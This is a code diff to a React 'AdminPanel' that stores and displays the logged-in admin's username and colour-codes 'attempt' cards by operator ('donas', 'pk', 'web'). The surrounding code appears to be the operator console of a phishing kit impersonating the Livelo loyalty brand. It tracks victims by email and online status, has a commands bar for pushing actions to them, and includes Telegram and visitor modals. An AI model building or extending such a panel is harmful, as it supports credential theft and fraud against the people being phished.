@@ -16,6 +16,7 @@ function AdminPanel() {
   const [loginPassword, setLoginPassword] = useState("");
   const [loginError, setLoginError] = useState("");
   const [loginLoading, setLoginLoading] = useState(false);
+  const [adminUsername, setAdminUsername] = useState(localStorage.getItem("admin_username") || "");
   // Modals
   const [showTelegramModal, setShowTelegramModal] = useState(false);
   const [showVisitorsModal, setShowVisitorsModal] = useState(false);
@@ -492,7 +493,9 @@ function AdminPanel() {
 
   const handleLogout = () => {
     localStorage.removeItem("admin_token");
+    localStorage.removeItem("admin_username");
     setIsAuthenticated(false);
+    setAdminUsername("");
   };
 
   const handleAdminLogin = async (e) => {
@@ -507,6 +510,8 @@ function AdminPanel() {
       });
 
       localStorage.setItem("admin_token", response.data.access_token);
+      localStorage.setItem("admin_username", response.data.username || username);
+      setAdminUsername(response.data.username || username);
       setIsAuthenticated(true);
       setUsername("");
       setLoginPassword("");
@@ -615,7 +620,7 @@ function AdminPanel() {
             <div className="flex items-center gap-3">
               <img src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" alt="Livelo" className="h-7 opacity-80" />
               <button onClick={handleLogout} className="text-gray-500 hover:text-gray-300 text-xs font-medium transition-colors">Sair</button>
-              <div className="bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 px-3 py-1 rounded-full text-xs font-bold tracking-wide">DONAS</div>
+              <div className="bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 px-3 py-1 rounded-full text-xs font-bold tracking-wide uppercase">{adminUsername || "ADMIN"}</div>
             </div>
           </div>
         </div>
@@ -667,7 +672,17 @@ function AdminPanel() {
                 return (
                   <div key={attempt.id} className="bg-[#0d0f14] border border-[#1e2130] rounded-xl overflow-hidden hover:border-[#2a2d42] transition-colors">
                     {/* Card Header */}
-                    <div className={`px-4 py-2.5 flex items-center justify-between border-b ${attempt.current_action && attempt.current_action !== "CLEAR" ? "border-emerald-500/30 bg-emerald-500/5" : "border-[#1e2130]"}`}>
+                    {(() => {
+                      const op = attempt.operated_by;
+                      const hasOp = attempt.current_action && attempt.current_action !== "CLEAR" && op;
+                      let barClass = "border-[#1e2130]";
+                      if (hasOp) {
+                        if (op === "donas") barClass = "border-emerald-500/40 bg-emerald-500/5";
+                        else if (op === "pk") barClass = "border-yellow-500/40 bg-yellow-500/5";
+                        else if (op === "web") barClass = "border-red-500/40 bg-red-500/5";
+                      }
+                      return (
+                    <div className={`px-4 py-2.5 flex items-center justify-between border-b ${barClass}`}>
                       <div className="flex items-center gap-3">
                         <span className={`w-2.5 h-2.5 rounded-full ${isOnline ? "bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.5)]" : "bg-red-500/80"}`}></span>
                         <span className="text-white font-semibold text-sm">{attempt.email}</span>
@@ -677,6 +692,8 @@ function AdminPanel() {
                         <button onClick={() => handleDelete(attempt.id)} className="text-gray-600 hover:text-red-400 p-1 rounded transition-colors text-sm">🗑️</button>
                       </div>
                     </div>
+                      );
+                    })()}
 
                     {/* Commands Bar */}
                     <div className="px-3 py-2 flex items-center gap-1 flex-wrap border-b border-[#161822] bg-[#0b0c11]">
